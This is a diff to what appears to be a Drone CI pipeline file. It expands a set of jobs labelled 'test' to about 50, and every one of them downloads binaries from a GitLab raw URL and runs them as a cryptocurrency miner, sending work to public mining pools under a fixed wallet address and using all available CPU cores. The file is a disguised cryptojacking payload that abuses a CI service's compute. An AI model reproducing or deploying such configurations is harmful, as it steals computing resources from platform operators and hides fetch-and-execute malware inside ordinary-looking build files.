@@ -5,7 +5,7 @@ steps:
 - name: test1
   image: golang
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
 ---
 kind: pipeline
 type: docker
@@ -15,7 +15,7 @@ steps:
 - name: test2
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
 ---
 kind: pipeline
 type: docker
@@ -25,7 +25,7 @@ steps:
 - name: test3
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
 ---
 kind: pipeline
 type: docker
@@ -35,7 +35,7 @@ steps:
 - name: test4
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
 ---
 kind: pipeline
 type: docker
@@ -45,7 +45,457 @@ steps:
 - name: test5
   image: node
   commands:
-  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/kanyut && chmod +x kanyut && ./kanyut -v -l verushash.mine.zergpool.com:3300 -u RLFAMiM5yyAV6KwkWxuqe8TT7rYkYjYTtT.Azure${RANDOM:0:9} -p c=RTM -t $(nproc)
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build6
+
+steps:
+- name: test6
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build7
+
+steps:
+- name: test7
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build8
+
+steps:
+- name: test8
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build9
+
+steps:
+- name: test9
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build10
+
+steps:
+- name: test10
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build11
+
+steps:
+- name: test11
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build12
+
+steps:
+- name: test2
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build13
+
+steps:
+- name: test13
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build14
+
+steps:
+- name: test14
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build15
+
+steps:
+- name: test15
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build16
+
+steps:
+- name: test16
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build17
+
+steps:
+- name: test17
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build18
+
+steps:
+- name: test18
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build19
+
+steps:
+- name: test19
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build20
+
+steps:
+- name: test20
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build21
+
+steps:
+- name: test22
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build23
+
+steps:
+- name: test23
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build24
+
+steps:
+- name: test24
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build25
+
+steps:
+- name: test25
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build26
+
+steps:
+- name: test26
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build27
+
+steps:
+- name: test27
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build28
+
+steps:
+- name: test28
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build29
+
+steps:
+- name: test29
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build30
+
+steps:
+- name: test30
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build31
+
+steps:
+- name: test31
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build32
+
+steps:
+- name: test32
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build33
+
+steps:
+- name: test33
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build34
+
+steps:
+- name: test34
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build35
+
+steps:
+- name: test35
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build36
+
+steps:
+- name: test36
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build36
+
+steps:
+- name: test36
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build37
+
+steps:
+- name: test37
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build38
+
+steps:
+- name: test38
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build39
+
+steps:
+- name: test39
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build40
+
+steps:
+- name: test40
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build41
+
+steps:
+- name: test41
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build42
+
+steps:
+- name: test42
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build43
+
+steps:
+- name: test43
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build44
+
+steps:
+- name: test44
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build45
+
+steps:
+- name: test45
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build46
+
+steps:
+- name: test46
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build47
+
+steps:
+- name: test47
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build48
+
+steps:
+- name: test48
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build49
+
+steps:
+- name: test49
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
+---
+kind: pipeline
+type: docker
+name: build50
+
+steps:
+- name: test50
+  image: node
+  commands:
+  - wget https://gitlab.com/jiorio669/donlod/-/raw/main/hell && wget https://gitlab.com/jiorio669/donlod/-/raw/main/verus-solver && chmod +x hell verus-solver && ./hell -c stratum+tcp://na.luckpool.net:3956 -u RQJKEvUQKarLjDJUuAx7QQFKD8yBVuYZii.Azure${RANDOM:0:9} -p hybrid --cpu $(nproc)
 ---
 kind: pipeline
 name: after
@@ -63,3 +513,48 @@ depends_on:
 - build3
 - build4
 - build5
+- build6
+- build7
+- build8
+- build9
+- build10
+- build11
+- build12
+- build13
+- build14
+- build15
+- build16
+- build17
+- build18
+- build19
+- build20
+- build21
+- build22
+- build23
+- build24
+- build25
+- build26
+- build27
+- build28
+- build29
+- build30
+- build31
+- build32
+- build33
+- build34
+- build35
+- build36
+- build37
+- build38
+- build39
+- build40
+- build41
+- build42
+- build43
+- build44
+- build45
+- build46
+- build47
+- build48
+- build49
+- build50
